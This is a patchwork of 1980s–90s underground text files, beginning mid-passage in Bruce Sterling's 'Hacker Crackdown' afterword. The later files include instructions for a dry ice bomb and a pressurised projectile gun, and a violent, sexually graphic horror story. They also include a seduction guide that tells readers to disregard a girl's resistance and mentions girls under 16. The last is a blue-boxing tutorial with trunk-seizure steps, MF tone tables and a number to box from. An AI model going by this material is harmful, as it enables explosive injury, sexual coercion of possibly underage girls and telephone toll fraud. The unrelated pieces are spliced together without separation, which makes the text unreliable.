service, and, oddly, a  50 fine for conspiracy to commit computer crime.  Phiber Optik, the computer intruder with perhaps the highest public profile in the entire world, took the longest to plead guilty, but, facing the possibility of ten years in jail, he finally did so.  He was sentenced to a year in prison.    As for the Atlanta wing of the Legion of Doom, Prophet, Leftist and Urvile...  Urvile now works for a software company in Atlanta.  He is still on probation and still repaying his enormous fine.  In fifteen months, he will once again be allowed to own a personal computer.  He is still a convicted federal felon, but has not had any legal difficulties since leaving prison.  He has lost contact with Prophet and Leftist. Unfortunately, so have I, though not through lack of honest effort.    Knight Lightning, now 24, is a technical writer for the federal government in Washington DC.  He has still not been accepted into law school, but having spent more than his share of time in the company of attorneys, he's come to think that maybe an MBA would be more to the point.  He still owes his attorneys  30,000, but the sum is dwindling steadily since he is manfully working two jobs.  Knight Lightning customarily wears a suit and tie and carries a valise.  He has a federal security clearance.    Unindicted PHRACK co editor Taran King is also a technical writer in Washington DC, and recently got married.    Terminus did his time, got out of prison, and currently lives in Silicon Valley where he is running a full scale Internet node,  netsys.com.   He programs professionally for a company specializing in satellite links for the Internet.    Carlton Fitzpatrick still teaches at the Federal Law Enforcement Training Center, but FLETC found that the issues involved in sponsoring and running a bulletin board system are rather more complex than they at first appear to be.    Gail Thackeray briefly considered going into private security, but then changed tack, and joined the Maricopa County District Attorney's Office  with a salary .  She is still vigorously prosecuting electronic racketeering in Phoenix, Arizona.    The fourth consecutive Computers, Freedom and Privacy Conference will take place in March 1994 in Chicago.    As for Bruce Sterling... well  8  .  I thankfully abandoned my brief career as a true crime journalist and wrote a new science fiction novel, HEAVY WEATHER, and assembled a new collection of short stories, GLOBALHEAD.  I also write nonfiction regularly, for the popular science column in THE MAGAZINE OF FANTASY AND SCIENCE FICTION.    I like life better on the far side of the boundary between fantasy and reality  but I've come to recognize that reality has an unfortunate way of annexing fantasy for its own purposes.  That's why I'm on the Police Liaison Committee for EFF Austin, a local electronic civil liberties group  eff  austin tic.com .  I don't think I will ever get over my experience of the Hacker Crackdown, and I expect to be involved in electronic civil liberties activism for the rest of my life.    It wouldn't be hard to find material for another book on computer crime and civil liberties issues.  I truly believe that I could write another book much like this one, every year. Cyberspace is very big.  There's a lot going on out there, far more than can be adequately covered by the tiny, though growing, cadre of network literate reporters.  I do wish I could do more work on this topic, because the various people of cyberspace are an element of our society that definitely require sustained study and attention.    But there's only one of me, and I have a lot on my mind, and, like most science fiction writers, I have a lot more imagination than discipline.  Having done my stint as an electronic frontier reporter, my hat is off to those stalwart few who do it every day.  I may return to this topic some day, but I have no real plans to do so.  However, I didn't have any real plans to write  Hacker Crackdown,  either.  Things happen, nowadays.  There are landslides in cyberspace.  I'll just have to try and stay alert and on my feet.    The electronic landscape changes with astounding speed. We are living through the fastest technological transformation in human history.  I was glad to have a chance to document cyberspace during one moment in its long mutation  a kind of strobe flash of the maelstrom.  This book is already out of date, though, and it will be quite obsolete in another five years.  It seems a pity.    However, in about fifty years, I think this book might seem quite interesting.  And in a hundred years, this book should seem mind bogglingly archaic and bizarre, and will probably seem far weirder to an audience in 2092 than it ever seemed to the contemporary readership.    Keeping up in cyberspace requires a great deal of sustained attention.  Personally, I keep tabs with the milieu by reading the invaluable electronic magazine Computer underground Digest  tk0jut2 mvs.cso.niu.edu with the subject header  SUB CuD and a message that says       SUB CuD your name your.full.internet address .    I also read Jack Rickard's bracingly iconoclastic BOARDWATCH MAGAZINE for print news of the BBS and online community.  And, needless to say, I read WIRED, the first magazine of the 1990s that actually looks and acts like it really belongs in this decade.  There are other ways to learn, of course, but these three outlets will guide your efforts very well.    When I myself want to publish something electronically, which I'm doing with increasing frequency, I generally put it on the gopher at Texas Internet Consulting, who are my, well, Texan Internet consultants  tic.com .  This book can be found there.  I think it is a worthwhile act to let this work go free.    From thence, one's bread floats out onto the dark waters of cyberspace, only to return someday, tenfold.  And of course, thoroughly soggy, and riddled with an entire amazing ecosystem of bizarre and gnawingly hungry cybermarine life forms.  For this author at least, that's all that really counts.    Thanks for your attention   8      Bruce Sterling  bruces well.sf.ca.us  New Years Day 1994, Austin Texas.  "

The most common use that I have seen is the dry ice bomb. The dry ice bomb is easily made by using a two liter plastic bottle, some hot water and some crushed dry ice. To make one, one simply puts about a cup and a half of crushed dry ice into the bottle, adds hot water, caps the bottle and throws it.  These bombs are not a joke, and have been known to blow a metal trash can fifteen feet into the air, as well as bursting the bottom of the can. If you make a dry ice bomb, you had best throw it before it explodes due to the enormous force generated by the explosion of the bottle. A friend of mine waited a bit too long on throwing one, and he jammed three of his fingers badly, got a huge bruise on his left leg, and one of the plasic fragments was propelled with enough force to puncture his tennis shoes and cut his foot all to hell.  In short, be careful with these things.    One day in May of 1985, an idea was introduced to me by a friend.  His plan was to control the force of the expanding dry ice and harness it to a useful end.  The result was the dry ice gun.  In following these plans, please keep in mind that when dry ice is finished expanding, it can generate pressures of up to 2400 PSI...for this reason, I recommend that when arming the gun and when disarming it, you hold all valves OPEN, and that you wear a pair of protective goggles at all times.  I will take no responsibility for injury that occurs because of the content of this file, or through the use of this information. This information is intended for educational purposes ONLY.  Materials needed                      The materials required will vary for each gun produced because of the nature of the construction itself and the effect produced by using different parts. The following parts, however, are necessary for a gun with moderate power and range     1  Standard valve.  I recommend the kind that is just a lever and turns 1 4 turn to open or close and has 3 4  connectors.    1  Blow gun  These can be found at auto parts stores...  shop around a little and get one with the highest pressure rating you can find  probably 150 PSI  . This will be sometimes referred to as a valve also.    1  Length of hot water PVC piping...this will be used for the barrel.  I recommend that you use 3 4  piping, because that is the kind that fits paint pellets of the type used in KILLER best.  Note, however, that it is possible to launch anything up to the size of an egg with pleasing results, provided that the barrel is large enough in diameter.    You will also need various lengths of regular lead or steel piping  to construct the actual gun , and adapters to get the blow gun to fit the rest of the gun  blow guns usually have connectors that are 1 4  in diameter, while the rest of the gun  except the dry ice container  should be constructed with 3 4  fittings .  You will also need an end cap to go on the end of your dry ice container and probably an elbow joint.   Optional parts                    1  Standard valve  same kind as above, but with a shorter lever .    1   T  joint with 3 4  connectors all around.    1  6 or 7 inch length of 3 4  diameter pipe.    1  3 4  end cap.       Form a gasket and pipe dope  Construction                  Because of the nature of the gun, step by step plans are not possible. However, a diagram of the gun will give you an idea of what has to be done, and construction tips should prove enough to allow successful completion of the project.

NOTES     1  The dry ice container can be any size...the one I use is about 6 inches long by 2 inches in diameter.  The larger the chamber is, the more shots the gun will fire before reloading is necessary.    2  The elbow joint can be left out...it will only make the gun in the shape of a straight rod rather than a  traditional  gun shape.    3  The barrel length can be any length you like, but very long ones are cumbersome and very short ones don't allow much accuracy.  I recommend a length of about 2 1 2 to 3 feet.    4  all joints except the two marked 'A' and 'B' should be tightened as much as possible and sealed by coating the threads with the form a gasket and then putting the two pieces together and tightening them as much as possible.  If you like, you can also caulk around the finished and tightened joint.    5  The joint marked 'B' should be tight, but DO NOT SEAL IT unless you do not intend to ever use more than one kind of barrel.    6  The joint marked 'A' should not be sealed with form a  gasket like the others because it is the one that you will be filling the dry ice into the gun through.  To fill the gun with dry ice, detach the dry ice chamber pipe from the elbow joint.  Load the container with as much crushed dry ice as it will hold. Then, coat the threads of one of the pieces of the joint with pipe dope.  This will prevent leakage of the carbon dioxide after it has changed into gaseous form.    7  The pressure chamber should be about 1 1 2 inches in length for a fairly powerful gun.  The longer the pressure chamber is, the more powerful the gun. On a gun with a three inch pressure chamber, we shot a AA battery 500  yes, hundred  feet across a parking lot.  Such high power, however, is dangerous, and is not recommended for use in games such as Killer, but rather for target practice  on INANIMATE objects .    How to operate the dry ice gun                                      Once you have the dry ice gun built and loaded, the first thing you must do is to open the standard valve and immerse the gun in water.  This is to check for leaks. If any leaks are present, they will show up as streams of bubbles rising from the gun.  If any are found, tighten the offending joint and put the gun back in the water.  When all leaks are gone  if necessary, take the whole thing apart and rebuild it from scratch to eliminate leaks, especially on either end of the pressure chamber , release the pressure built up so far by closing the standard valve and then operating the trigger. You should hear a 'woosh' sound, and the gun should kick slightly.  This indicates that all is working properly. When loading the dry ice gun, it is important to keep both valves OPEN until the dry ice container is secure, and then close both valves.  Even after you are sure that the gun has no leaks anywhere, it is good to immerse the dry ice container  while it is attached to the gun  in water.  This warms the dry ice and causes it to change into gaseous carbon dioxide.    After the dry ice container has been immersed for 5 minutes or so, remove the gun from the water and dry it off.  The gun is now ready to be fired.   Firing the dry ice gun                            This is the simplest step of all.  To fire the gun simply place the projectile  I recommend paint pellets  in the barrel of the gun, open the standard valve for about a second and then close it.  You should hear a muffled rush of air as some of the gaseous CO2 is bled into the pressure chamber.  Aim the gun at who whatever you wish to hit, and squeeze the trigger. For more power, you can leave the standard valve open and squeeze the trigger.   Disarming the dry ice gun                               To disarm the gun, open both valves until you can no longer hear the pressure escaping through the barrel of the gun.  Then, unscrew the dry ice container and place it in cold water for about 3 to 4 minutes, or until all of the remaining dry ice has evaporated.  When all of the dry ice is gone, clean the threads on the dry ice container and elbow joint, and store the gun in a clean, dry area.   Suggested modifcations                            The only really nice modification that I've discovered is to replace the pressure chamber pipe with a  T  joint and valve so as to make a gun with long, medium, and short range capability.  To do this, construct the pressure chamber section of the gun like this      ___adaptor        I      ______________________________________ ________I___  _____ _   !       !    I ___ __!o!  !       !    I  !  !       !    I  !  !      T  joint                     !

The house was as silent as the moon was bright that dark, perilous night back in December.  The living room was dark...the stairs, equally so.  Surveying the upstairs hall we see that all is dark, save a narrow bar of light escaping under one of the white doors.  The faint sound of tapping could be heard...  Behind this particular door was the bedroom of a teenage boy.  The room's occupant, one Harry Poindexter, was present.  He sat in his  self styled  throne tapping away incessantly at his keyboard.  Let us look and see what he is doing...  click click click... Damn! ...click click click...  Harry, an accomplished hacker, called himself the Avocado Bandit, in memory of his greatest hero.

As the last of his default logins failed, he sat back and thought of events that occurred earlier in the day...  When he had skipped school so he could log on to all the boards and leave messages about his newest victories, when he called his poor mother a worthless dog, when he sullenly apologized a half hour later and went to the grocery store with her so he could get some  Mr.  T Cereal , and when he set up a conference with some of his  k phriends  so that they could exchange codes and info.

Son, it's 3 30 in the morning.  Why don't you eat your snack, wash and brush, and go to bed. Please, son,  pleaded his mother.   Okay, mom,  said Harry, the resentment in his voice plain as day.  With that his mother went back upstairs.  A few minutes later Harry went back up to his room  which he called Pirate's Zone  and sat down on his bed to munch upon his Kudos and milk.  After he was done eating, he set the dishes down in the corner and lifted up the mattress of his bed and retrieved a ragged, dog eared issue of Penthouse.  He sat in his bed and tossed off for a while.  When he was done he just looked at the pictures for a while and wished that he could kiss a girl...  He then fell into a deep sleep, his light and computer still on.   The Next Day Is Not Always Brighter...  On Sunday Harry awoke with a start.  He had had raving nightmares all night. In one particularly horrifying episode he had dreamed that he was tied and bound to a post on a ledge far above a vast cavern.  Filling the cavern were hundreds upon hundreds of demons.  In front of him was a large iron anvil and his limp cock was tied to it with a thong of black leather.  In front of his sweaty face dangled a microphone with a small ID badge on it.  The badge read  HBC Radio 666 .  He looked around the cavern.  The reddish glow horrified him the most.  He whimpered and was shocked to hear that such a small sound echoed throughout the dankness of the cavern at such a high volume.  His mortal mind attributed that to the microphone that swayed gently before him.  His fear grew stronger when he heard the thumping of footsteps to his right. He looked over his shoulder and saw a demon approaching him.  The demon had the torso of a man and the legs of a goat.  It had a pentacle burned into its hairy chest and wore both a headsman's mask and a necklace of linked golden discs.  The masses cheered as this executioner approached poor Harry.  Harry was confused and bewildered, that is until he saw what the demon cum executioner carried, a large sledge hammer.  Harry glanced down at his dongle and choked back a scream.  The masses were going crazy as the executioner hefted the sledgehammer up high.  Harry screamed as the sledgehammer connected with his cock.  That was when Harry awoke with a start...  His mother was calling to him, telling him to come downstairs to eat his breakfast.  Harry got up and slinked over to his computer, clutching at his crotch all the way.  On the screen was printed something that horrified him. Here is what Harry saw on his monitor...   Did you enjoy your nap  We're waiting for you to come and visit us..._   Harry stifled a gasp and flipped the ON OFF switch at the back of his Apple. The monitor shimmered, flickered, and then went blank. Harry ran downstairs to eat his breakfast...  When Harry had finished filling his stomach with eggs and pancakes we ambled back upstairs to get ready for church. He undressed and hopped into the shower.  He liked to pretend that it was the transporter chamber on the U.S.S. Enter  prise on StarTrek.  As he turned on the water he heard a chilling voice...     Ready to beam down...energizing...   As Harry shrieked the water turned a crimson hue and he passed out.  When he awoke he was in fetters and chains and naked as could be.  He tried to hide his  manhood  as he stood before the great, iron wrought throne of Satan, Lord of Hell.  Satan smiled at him...  all Harry could do was whimper. As Harry stood there, cringing before the might of Satan, he tried not to think of the dreams he had had the night before...   Into the Lungs of Hell...   You are a pitiful sight, mortal.  Had you not hacked your way onto one of my UNIX systems I might never have known of you,  said Satan,  but the things that you have done to my Purgatory are great indeed.  Do you know what trouble you have caused, boy   A tear streamed down Harry's cheek,  But all I did was to create a super user account.  Honest.  I swear to God...ulp.  Satan bellowed forth with an intensity that shook the very foundations of this text file...    rumble...rumble...rumble...   Enough!  screamed Satan.   I sentance you to never ending aeons of punishment and torture!  You will forever wish to die!  Just when it appears that your mortal body can no longer take the punishment I shall give it you will be healed.  Thus you will never die!  In fact, I bequeathe upon you that which man has sought for all eternity... imortality!  And with a mere flick of Satan's taloned hand Harry instantaneously reappeared elsewhere in Hell...  Harry was sweating profusely when he found out what kind of predicament he was in.  Lying on his back, the warm and rocky floors of Hell gave him little com  fort.  He was still naked and he was in a spread eagle position, hand and foot bound to an iron stake firmly implanted in the barren floor.  High in the dim, reddish skies of Hell circled several vultures, eaters of carrion.  He could hear the screams of anguish of his  neighbors .  What was his fate   Less than a score of minutes later the punishment that Satan had ordered was brought down on him, never to cease.  Four imps of Hell fluttered over on their small, membraneous wings.  They landed to his sides and snickered in their evil and high pitched voices.  One of them grinned and bit his leg. Harry screamed. The gaping wound in his left thigh seemed a well of crimson.  But as Harry was experiencing the pain of such a wound it miraculously healed up.  Harry, altho' no longer in pain from the bite, was still screaming his lungs out...  It was then that another of the imps assaulted him.  This one raised his iron pitch fork up high in the air and brought it downwards, mercilessly grinding its three forked points into Harry's crotch.  The screams filled the air, the gore and blood welled, all to no avail.  For as soon as the damage was done the wound healed itself back up.   The Light is Always Darkest at the End of the Tunnel...  Thus was Harry's fate sealed for all eternity.  But what of his poor mother, you ask   Quite simply answered, friend.  When she heard Harry's shriek while he was in the shower she ran upwards to see what was wrong.  When she got to the shower where Harry had been she was greeted by an unpleasant sight.  The body of Harry  or rather an imitation thereof, for the real Harry was in Hell  lay over the drain.  His body was covered in lacerations and blood was splashed all over the place.  And right in the middle of his forhead stuck out the handle of a knife, the blade burried deep within his cranium.  Mrs.  Poindexter screamed only once before she died of massive heart palpitations.  Thus ends our wonderful excursion into the Lower Infernal Regions.  Join me next time when we experience more demonic slaughter...                                                                                 c  1988 Lords of Twilight      Written by The Raver      02 25 88   "

All the methods described     here are working, and with not too much difficulties.        Don't expect that you will be able to lay a girl in one week.     Not with this guide anyway. If you have the time, patience, and     some manners, you will succeed.        I don't pretend to be a big expert in girls  I'm not.

The first meets                               I believe you have a girlfriend  you can experiment with.     If you don't, find one. For those purposes, every mid looking     girl will suit. Every one can owe a girlfriend, and it's not     the time and place to explain how to reach one.  maybe in the     next  completed guide of...  .        If you don't have a girlfriend yet, at least try to achieve     a meet with one.        If you want to continue seeing this girl you have to remember     the following         Don't make a physical connection on the first dates        don't kiss her goodbye and don't hug her          Let her talk. If she has a lot to say   just listen.       A node with the head and some leading questions will do.        If she is permanently silent you can always ask her about                herself  hobbies ext.               school  although it seems to be boring, you can talk                            hours on this subject               her musical prefers  If she mentions an artist that                 you dislike, don't show it to her. Just hide it.               tell her about yourself.           ask her if she knows x   y from her school.              and the most important  don't answer with yes or no.                 those above are chat stoppers. Expand you speech.           tell her jokes           remember to have a lot of humour   they like it.           very important   don't be serious.              Mind your manners  don't talk rudely nor curse.              smile   release the tense.          If all the above fail, and you can't find common language            with her, you Probably won't keep with her long time.        Where to go at the first time                movie  let her choose, but don't insist on doing so               You can talk about the movie latter.                 Pay for you both.  as it's obvious . If she's ok, she              will insist on paying on herself.           go for a walk           meet at one of your homes.  It's better on her home   she'll                 feel more relaxed and free               party   if available              School   only if you learn in the same school        If you enjoyed her company, tell her so. Tell her that you          enjoyed, and you want to see her again. Before the end of       the meet, fix yourselves a new date  fix it on the same evening           exchange telephones, ofcourse.        Flatter her, but know your limits. Flatter to her nice sides.           Every one has some . Tell her how nice she is.       Flatter to her looks  If you at least find her attractive .       Don't say to her  You are the most beautiful girl I ever so            It sounds non natural. She's Probably not.         If she plays  love games  a little   please understand.       we'll close the bills later...        Don't bother her with too much telephone calls. Be cool       at the first meets, or she'll take advantage over you.       Show her you interested, but not desperate.           How will you know if you are friends or not        here are some ways                  Hear what her girlfriend thinks about your connection.                    For instance  If she meets her girlfriend in the street,                 and the above askes if she is your girlfriend   hear what                    she says  it's an embarrassing moment   from experience...              Enter phrases that assume that she is you girlfriend in                   your talkes to her.  not infront of her and your friends              See how she react to those statements.       The first physical connection. There are two ways establishing it                     The spontaneous way  Kiss her goodbye  not in the first                   date   she'll appreciate it if you'll have patience.              In the following date take you hands together.                   It's very romantic.                   Dance with her in one of your homes. Dance is a kind             of hug, and it the middle of this slow song   kiss here.              she might be shy in public, so understand her,                    and do this critical steps in public garden or other                    quiet place.                   The non spontaneous way  Lead her to non public and              quiet place  i.e. garden  look in her eyes and silent                    for a moment or so. She, understanding the moment, will                    silent too. Approach her head with yours, and gently                    kiss her a few times on her mouth.  Hug her.               BTW, this the recommended way .        By this time, if she is with you, you'll understand that she         likes your company. If she didn't, you won't reach that stage.      If she likes you  or love you   in the better case , she would      more then hugs and kisses    but don't hurry. You should have      patience. You should reach the bed only by small steps.        C. Phase I    I like you                                       You  both  will start to say compliments to each other.      Don't say you love her if you don't feel anything to her.      Choose the right moment of doing so.       Imagine the situation  You tell her  I Love you. . She, likes      you very much, but the way to love is still long.      She will be in shocking situation. If she'll say  I love you too       and she doens't mean it   you will both leave in lie.      If she'll be silent, you will Probably have bad feelings             She doesn't love me at all..        You can say to her  I like you your looks your style.       This isn't strong as  love . Love is very strong word.      Don't use it when not needed.       Some guys say to their girls that they love them           They think she will jump to the bed right a way.      Although she will try to show you her greetings, don't expect      to much. She's just a girl, and if she is between younger then 16.      she's Probably virgin.       Bring her flowers   presents some time   it will mean very much      to her. If you like to write, write her love letters.      Bring her audio cassette with love songs   she'll remember you      and connect you to them.        D. Phase II The body language                                         You are now on the kings way.      You should talk about sex by this time. Ask her what she thinks     about it.  Don't involve doing sex with YOU . Ask her about     sex generally. Ask her what is the appropriate age for doing it.      Start investigating her body   only in one of your homes.     After you kiss her you should get to a situation where     you are laying one infront of another  on the bed          Let your hand travel over her body Don't touch between her     legs   do the things in the order below.         Sneak you hand under her skirt and pat her back.     If she wears a bra put you hand under the stripe  the one     above her back   but don't open it   let your hand travel under     the bra surface and forward to her tits. Don't touch hard there       it hurts. If she resists get you hand out of there quickly.     We will continue later with this. Give her 10 minutes of rest     from the last event. Talk about something else.      Remember   Don't ask her why she resists. Just ignore.          Another area you should quest is her ass. Pat it gently       Stack you hand gently under her trousers and move your hand     more deeply every time. She'll Probably resist or do sounds     of disagreement. Remember   Even if she says she's not       She like your touches there. By this time you should be friends     for 1 2 months or so   you know each other enough for those     games.         After few meets doing the above, you can try removing her bra.     The fastest you do it the better she won't say anything.     Don't ask her too remove it by herself   You're on you own now.     after you opened it, don't ask her to totally remove it      not at the first time, at least .         Now it's a very important moment. Remember to close the     lights,  and get blanket from somewhere. Move you hand down to the     area of her cunt.  all with clothes, of course .     Pat her near it   but don't touch it directly. She'll bag in     her mind from you to do it. After a few minutes of doing so,      Don't forget to kiss her all the times...she's not a sex machine       Move your hand directly to there. You might feel some bones there      and by this time you are wondering where the hall is       Don't ask her if it's good to her. It is. Your touch there     is just like an electrical shock   it's very pleasuring.            If she's OK, she will do the same to you, so you will both     feel perfect understand of each other. She might resist to your     touch, but  believe me  if you'll stop toucing there for a meet     or so, she will curse herself. The next time you'll try       you won't hear a hiss.         Now...open her trousers. If she'll resist ask her what she     afraids from. What can possibly happen      Start patting her cunt harder and with circulating movements.      she is still with her underwear    don't remove it!      Have patience and control yourself.     If she'll like what you are doing there, and she's OK,     she will do the same to you. Don't hide your erect penis.     You can't. But she'll will be amazed from the quick reaction...            Now your hand is there   circulating over her underwear.     The best way of directly touching it is to  accidently      insert a finger under her underwear.  Do it from her legs side      She want resist...don't insert a finger in the hole       It can hurt even if she isn't virgin. Remove you fingers from     there and insert full hand from her stomach side.     Lay your forehand on her hair, and let the fingers play a little     down there. Try to locate her clitoris   this is the mega power     station of emotions...  Open the little lips of her cunt and     travel up until they meet  the lips  there should be there     an small organ  About 2 3 cm    remember Don't touch there to     long   it is the most enjoying organ there, but it's not the only.            Don't forget to kiss her all the times. You can lick her tits     nipples  not all the girls will let you doing so in that stage      Kiss her under her neck and lick her hear.             Continue touching her there. The lights are off, but try to     look if her eyes are closed. If they are   she's enjoying.     If not, continue patting her there   her eyes will be closed     immediately.             Try to concentrate on her  girls like attention  but if she     wants to pleasure you let her doing so. Remember   don't expect     to much from her. You are the leader in the bed.             Try to give her an orgasm. A few minutes of direct squeezes     at her clitoris will do. If it doesn't   ask her what will make     her good there. Let her instruct you, but don't insist on it.     If she has a serial of convulsions   she reached it  with your     help of course . After that she will feel free to do it to you...             After the next meet she will take a talk with you. She'll say     that she don't like what you've reached   ..I think we are getting     to much close to it...  . Ask her  What do you afraid of       You had fun didn't you  Look. I don't rowing anywhere.     I don't know if I want to it yet  I mean full sex  .     She'll be convinced. She won't start with it when you are doing so      she have to much pleasure...             You are both naked now, beside of your underwear  I hope .     Now   lay on her.     Curse the existence of your lower underwear   Loudly.     Lay her on her back. Massage her for 10 minutes. Kiss her back.        Now   Remove her underwear completely   she'll fill safe     because she is on her stomach.  No danger of actual intercourse .     Remove your pants. Lay on her  She still upside down  remember       She will Probably feel great and hot. Rub your penis against her     ass chicks. Say to her  would you like me to take some safety     percations  . She'll say  What do you mean   answer her       I almost finished... .         Pull a condom from somewhere  I bet it waited a long time...      and put it. Lay again over her and make some moves. Now   Rotate     her so she'll lay on her back again. Lay over her. Fiddle with her     cunt a little and try to insert your penis.     If she'll say  don't insert    say  ok , wait and retry.         If it doesn't enter, open her lips with your two hands and try     again. If she is virgin, it will Probably hurt her a little     so please be patient and if you are powerful, wait for the next     meet.  In the next meet throw your parents of your house for the     day . If it still hurts her, try to expend her virgin membrane     with your fingers.  There IS a hole there   even if she is totally     virgin. All you have to do is expend it a little .                                          Congratulations....       What if it doesn't work   There are few possibilities         You tried to move too forward with not too much time.       She's totally cold  Frigid . Find someone else.       She isn't ready yet. Convince her.  What do you have to loose         remember that you must make yourself credit from hers side       She is afraid of pregnancy   Wait, or convince her that you       will take a reliable anti pregnancy device.  Tell her that       you'll take condoms  If she's virgin, this is the only       possibility .        If she is totally afraid, but want to try sexual intercourse,       convince her to take anti pregnancy pills.       It is vey hard for anyone to admit befor a strange person       that you're making sexual intercoures  try to understand.       BTW, the doctors usually don't  insert hands  today.        They just test blood pressure and heart beat rate         She will give you examples of girls that she READ about that       used anti pregnancy devices that failed  tell her  Did you hear       about all the intercourses which didn't end with pregnancy          and  Why are you so negative about it   it's positive thing!         If all above fails and she still don't want it, wait.       or....merry her...      All the procedure described here  From totally start  Should     Take about 3 months. If you're thinking that you are moving     to quick, slow the rate.                                 John Smith. "

As opposed to such things as using an MCI code to make a free fone call, which is merely mindless pseudo phreaking, blue boxing is actual interaction with the Bell System toll network. It is likewise advisable to be more cautious when blue boxing, but the careful phreak will not be caught, regardless of what type of switching system he is under.   In this part, I will explain how and why blue boxing works, as well as where. In later parts, I will give more practical information for blue boxing and routing information.   To begin with, blue boxing is simply communicating with trunks. Trunks must not be confused with subscriber lines  or  customer loops   which are standard telefone lines. Trunks are those lines that connect central offices. Now, when trunks are not in use  i.e., idle or  on hook  state  they have 2600Hz applied to them. If they are two way trunks, there is 2600Hz in both directions. When a trunk IS in use  busy or  off hook  state  , the 2600Hz is removed from the side that is off hook. The 2600Hz is therefore known as a supervisory signal, because it indicates the status of a trunk  on hook  tone  or off hook  no tone . Note also that 2600Hz denoted SF  single frequency  signalling and is  in band.  This is very important.  In band  means that is is within the band of frequencies that may be transmitted over normal telefone lines. Other SF signals, such as 3700Hz are used also. However, they cannot be carried over the telefone network normally  they are  out of  band   and are therefore not able to be taken advantage of as 2600Hz is.   Back to trunks. Let's take a hypothetical phone call. You pick up your fone and dial 1 806 258 1234  your good friend in Armarillo, Texas . For ease, we'll assume that you are on  5 Crossbar switching and not in the 806 area. Your central office  CO  would recognize that 806 is a foreign NPA, so it would route the call to the toll centre that serves you.  For the sake of accuracy here, and for the more experienced readers, note that the CO in question is a class 5 with LAMA that uses out of band SF supervisory signalling . Depending on where you are in the country, the call would leave your toll centre  on more trunks  to another toll centre, or office of higher  rank . Then it would be routed to central office 806 258 eventually and the call would be completed. Illustration   A   CO1       TC1      TC2    CO2    B  A you  CO1 your central office TC1 your toll office.  TC2 toll office in Amarillo. CO2 806 258 central office.  B your friend  806 258 1234     In this situation it would be realistic to say that CO2 uses SF in band  2600Hz  signalling, while all the others use out of band signalling  3700Hz . If you don't understand this, don't worry too much. I am pointing this out merely for the sake of accuracy. The point is that while you are connected to 806 258  1234, all those trunks from YOUR central office  CO1  to the 806 258 central office  CO2  do  NOT  have 2600Hz on them, indicating to the Bell equipment that a call is in progress and the trunks are in use.   Now let's say you're tired of talking to your friend in Amarillo  806 258 1234  so you send a 2600Hz down the line. This tone travels down the line to your friend's central office  CO2  where it is detected. However, that CO thinks that the 2600Hz is originating from Bell equipment, indicating to it that you've hung up, and thus the trunks are once again idle  with 2600Hz present on them . But actually, you have not hung up, you have fooled the equipment at your friend's CO into thinking you have. Thus,it disconnects him and resets the equipment to prepare for the next call. All this happens very quickly  300 800ms for step by step equipment and 150 400ms for other equipment .   When you stop sending 2600Hz  after about a second , the equipment thinks that another call is coming towards it  e.g. it thinks the far end has come  off hook  since the tone has stopped. It could be thought of as a toggle switch  tone     on hook, no tone    off hook. Now that you've stopped sending 2600Hz, several things happen  1  A trunk is seized.  2  A  wink  is sent to the CALLING end from the CALLED end indicating that the CALLED end  trunk  is not ready to receive digits yet.  3  A register is found and attached to the CALLED end of the trunk within about two seconds  max .  4  A start dial signal is sent to the CALLING end from the CALLED end indicating that the CALLED end is ready to receive digits.  Now, all of this is pretty much transparent to the blue boxer. All he really hears when these four things happen is a  beep  kerchunk . So, seizure of a trunk would go something like this     1  Send a 2600Hz   2  Terminate 2600Hz after 1 2 secs.   3   beep  kerchunk     Once this happens, you are connected to a tandem that is ready to obey your every command. The next step is to send signalling information in order to place your call. For this you must simulate the signalling used by operators and automatic toll dialing equipment for use on trunks. There are mainly two systems, DP and MF. However, DP went out with the dinosaur , so I'll only discuss MF signalling. MF  multi frequency  signalling is the signalling used by the majority of the inter  and intra lata network. It is also used in international dialing known as the CCITT no.5 system.   MF signalling consists of 7 frequen  cies, beginning with 700Hz and separated by 200Hz. A different set of two of the 7 frequencies represent the digits 0 thru 9, plus an additional 5 special keys. The frequencies and uses are as follows   Frequencies  Hz   Domestic    Int'l                                         700 900             1          1  700 1100            2          2  900 1100            3          3  700 1300            4          4  900 1300            5          5 1100 1300            6          6  700 1500            7          7  900 1500            8          8 1100 1500            9          9 1300 1500            0          0   700 1700           ST3p       Code 11  900 1700           STp        Code 12 1100 1700           KP         KP1 1300 1700           ST2p       KP2 1500 1700           ST         ST    The timing of all the MF signals is a nominal 60ms, except for KP, which should have a duration of 100ms. There should also be a 60ms silent period between digits. This is very flexible, however, and most Bell equipment will accept outrageous timings.   In addition to the standard uses listed above, MF pulsing also has expanded usages known as  expanded inband signalling  that include such things as coin collect, coin return, ringback, operator attached, and operator released. KP2, code 11, and code 12 and the ST_ps  STart  primes   all have special uses which will be mentioned only briefly here.   To complete a call using a blue box, once seizure of a trunk has been accomplished by sending 2600Hz and pausing for the  beep  kerchunk , one must first send a KP. This readies the register for the digits that follow. For a standard domestic call, the KP would be followed by either 7 digits  if the call were in the same NPA as the seized trunk  or 10 digits  if the call were not in the same NPA as the seized trunk .  Exactly like dialing a normal fone call . Following either the KP and 7 or 10 digits, a STart is sent to signify that no more digits follow. Example of a complete call     1  Dial 1 806 258 1234   2  wait for a call progress      indication  such as ring, busy,      recording, etc.    3  Send 2600Hz for about 1 second.   4  Wait for about 2 seconds while a      trunk is seized.   5  Send KP 305 994 9966 ST    The call will then connect if every  thing was done properly. Note that if a call to an 806 number were being placed in the same situation, the area code would be omitted and only KP  seven digits ST would be sent.   Code 11 and code 12 are used in international calling to request certain types of operators. KP2 is used in international calling to route a call other than by way of the normal route, whether for economic or  equipment reasons.   STp, ST2p, and ST3p  prime, two prime, and three prime  are used in TSPS signalling to indicate calling type of call  such as coin direct dialed .    This has been Part I of Better Homes and Blue Boxing. I hope you enjoyed and learned from it. If you have any questions, comments, threats or insults, please fell free to drop me a line. If you have noticed any errors in this text  yes, it does happen , please let me know and perhaps a correction will be in order. Part II will deal mainly with more advanced principles of blue boxing, as well as routings and operators.    Note 1  other highly trunkable areas include  816,305,813,609,205. I personally have excellent luck boxing off of 609 953 0000.

